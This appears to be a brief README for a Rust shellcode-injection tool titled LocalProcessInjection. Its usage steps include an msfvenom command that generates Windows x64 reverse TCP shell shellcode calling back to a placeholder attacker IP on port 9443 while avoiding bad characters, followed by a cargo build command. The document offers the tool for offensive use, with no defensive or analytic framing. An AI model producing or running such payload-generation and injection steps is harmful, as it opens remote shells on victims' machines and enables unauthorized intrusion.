# LocalProcessInjection
Executing Shellcode in Local Process 

msfvenom -p windows/x64/shell_reverse_tcp LHOST=Your_IP LPORT=9443 -f c -b \x00\x0a\x0d


cargo build --release


